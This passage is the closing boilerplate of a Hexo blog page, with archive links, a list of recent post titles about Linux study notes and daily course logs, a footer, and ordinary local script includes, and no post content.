10px;">计算机网络</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/12/02/day16_kls/">day16_kls</a>
          </li>
        
          <li>
            <a href="/2024/11/30/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%9F%A5%E7%9C%8B%E5%91%BD%E4%BB%A4/">linux常用的系统信息查看命令</a>
          </li>
        
          <li>
            <a href="/2024/11/30/day15_kls/">day15_kls</a>
          </li>
        
          <li>
            <a href="/2024/11/29/week3_kls_exam/">week3_kls_exam</a>
          </li>
        
          <li>
            <a href="/2024/11/29/day14_kls/">day14_kls</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>